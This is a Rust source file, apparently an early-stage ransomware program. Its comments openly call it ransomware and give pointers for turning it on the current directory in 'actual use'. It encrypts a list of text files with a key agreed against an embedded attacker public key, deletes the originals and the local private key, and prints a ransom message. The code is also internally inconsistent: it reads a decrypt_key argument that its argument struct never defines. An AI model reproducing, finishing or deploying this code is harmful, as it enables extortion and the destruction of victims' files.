/*
This basic viable product for a ransomware works, however it will not at the moment because of the AEAD algorithm and how it works when nonces are reused.
You either have to modify the enc to instead use a differrent standard other than AEAD or figure out how to ensure the nonce it different
each time the script is run even if the file data is different if the nonce is the same it will fail. THE NONCE CANNOT BE RESUED.
*/

use base64ct::Encoding;
use chacha20::{Key, Nonce};
use clap::Parser;
use p256::pkcs8::DecodePublicKey;
use p256::PublicKey;
use ransomware_utils::{
    dec_files, delete_files, dump_asym_keys, enc_files, get_keypair, get_symmetric_key,
    print_ransom_message,
};
use std::fs::remove_file;
const RANSOM_PUB: &str = include_str!("C:\\Users\\sebas\\OneDrive\\Desktop\\test\\ransom.pub");
#[derive(Parser, Debug)]
struct Args {
    file_path: String,
    cave_size: i32,
}

fn get_enc_file_names() -> Vec<String> {
    let mut file_list = Vec::new();

    //remember to change this directory when in actual use it will default to the current directory
    for entry in walkdir::WalkDir::new("C:\\Users\\sebas\\OneDrive\\Desktop\\test")
        .into_iter()
        .filter_map(|e| e.ok())
    {
        let file_path = entry.path().to_string_lossy().to_string();

        if entry.file_type().is_file() && file_path.contains("enc") && !file_path.contains("ransom")
        {
            file_list.push(file_path);
        }
    }

    file_list
}
fn main() {
    let args = Args::parse();
    let dec_key = args.decrypt_key;
    /*
    For future versions of the get_file_list() make it act differently depending on if its in dec
    or enc mode. So that it takes off the enc for the org file names or just gathers the files
    normally for enc mode from the directory.
     */
    let file_list = vec![
        "Sonnet 43.txt".to_string(),
        "Sonnet 55.txt".to_string(),
        "Sonnet 116.txt".to_string(),
        "Sonnet 130.txt".to_string(),
        "The Phoenix and Turtle.txt".to_string(),
        "The Rape of Lucrece.txt".to_string(),
        "Blow, blow, thou winter wind.txt".to_string(),
        "Fear no more the heat o’ the sun.txt".to_string(),
        "Sonnet 17.txt".to_string(),
        "Sonnet 20.txt".to_string(),
    ];
    match dec_key {
        //Decryption Path
        Some(key) => {
            let decoded_key = base64ct::Base64::decode_vec(&key).unwrap();
            let decoded_key_slice: &[u8] = decoded_key.as_slice();
            let key = Key::from_slice(decoded_key_slice);
            let mut nonce = Nonce::default();
            let enc_file_names = get_enc_file_names();
            dec_files(&enc_file_names, &file_list, &key, &mut nonce);
            delete_files(&enc_file_names).unwrap();
        }
        //Encryption Path
        None => {
            if file_list.len() < 1 {
                println!(
                    "No decryption key provided and files already encrypted\n\t\tPROGRAM \
                SHUTTING DOWN"
                );
                std::process::exit(0);
            }

            let (privk, pubk) = get_keypair(None);
            dump_asym_keys(&privk, &pubk, Some("for_decrypt"));
            remove_file("for_decrypt.priv").unwrap();
            let ransom_pub = PublicKey::from_public_key_pem(RANSOM_PUB).unwrap();

            let key = get_symmetric_key(&privk, &ransom_pub);
            let mut nonce = Nonce::default();

            enc_files(&file_list, &key, &mut nonce);

            delete_files(&file_list).unwrap();

            print_ransom_message();
        }
    }
}
